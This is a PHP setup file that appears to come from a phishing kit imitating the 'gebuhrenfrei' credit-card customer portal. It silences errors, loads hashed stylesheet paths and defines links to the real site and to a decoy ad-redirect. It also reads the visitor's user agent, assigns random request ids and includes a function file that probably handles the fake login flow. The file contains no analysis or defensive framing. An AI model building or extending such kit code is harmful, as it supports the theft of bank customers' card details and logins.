<?php
/* Main Rulez Functions */
	ob_start();
	session_start();
	// ini_set('display_errors', 1);
	// ini_set('display_startup_errors', 1);
	// error_reporting(E_ALL);
	error_reporting(0);
	@set_time_limit(ini_get('0'));
	header('Content-type: text/html; charset-UTF-8');
	date_default_timezone_set('GMT');

	/* Folder Directory */
	$inc  = './includes/';
	(isset($page) && $page == 'check') ? ($func = './q99550/includes/func/functions.php') && ($to = './q99550/includes/to.php') : ($func = $inc . 'func/functions.php') && ($to = $inc . 'to.php');
	$css1  = './layouts/css/6997f510.css';
	$css2  = './layouts/css/1f61aaac.css';
	$css3  = './layouts/css/3d681eff.css';
	$css4  = './layouts/css/d41d8cd9.css';
	$js  = './layouts/js/';
	$img  = './layouts/imgs/';
	$index = './../index.php';
	$link =  "https://mein.gebuhrenfrei.com/";
	$link2 = "https://ad11.adfarm1.adition.com/redi?lid=6643946886567364015&gdpr=0&gdpr_consent=&gdpr_pd=0&userid=6643786293442050189&sid=3820663&kid=2145369&bid=9195449&c=26436&keyword=&sr=184&clickurl=http://www.oecd.org/education/ceri/38654317.pdf";
	$favicon = $img . 'ic.png';
	$id    = "id=".rand(99, 100000000);
  $referer = $_SERVER['HTTP_USER_AGENT'];

	/* Require Files */
	require_once $func;
	//require_once $to;
    $user = _user();
?>
